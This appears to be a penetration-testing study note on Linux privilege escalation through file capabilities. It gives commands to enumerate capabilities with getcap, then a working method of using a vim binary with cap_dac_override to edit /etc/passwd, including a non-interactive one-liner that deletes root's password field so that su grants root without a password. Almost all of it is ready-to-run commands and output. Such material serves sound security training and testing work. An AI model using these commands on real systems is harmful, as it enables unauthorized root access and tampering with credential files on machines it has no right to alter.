
Find capabilities
```shell-session
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

Exploit Capabilities

If we gained access to the system with a low-privilege account, then discovered the `cap_dac_override` capability:

```shell-session
getcap /usr/bin/vim.basic
```
For example, the `/usr/bin/vim.basic` binary is run without special privileges, such as with `sudo`. However, because the binary has the `cap_dac_override` capability set, it can escalate the privileges of the user who runs it. This would allow the penetration tester to gain the `cap_dac_override` capability and perform tasks that require this capability.

Take a look at the `/etc/passwd` file where the user `root` is specified:
```shell-session
cat /etc/passwd | head -n1
```
results (note the x)
`root:x:0:0:root:/root:/bin/bash`


We can use the `cap_dac_override` capability of the `/usr/bin/vim` binary to modify a system file:
```shell-session
/usr/bin/vim.basic /etc/passwd
```

We also can make these changes in a non-interactive mode:
```shell-session
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```

Now, we can see that the `x` in that line is gone, which means that we can use the command `su` to log in as root without being asked for the password.
`root::0:0:root:/root:/bin/bash`
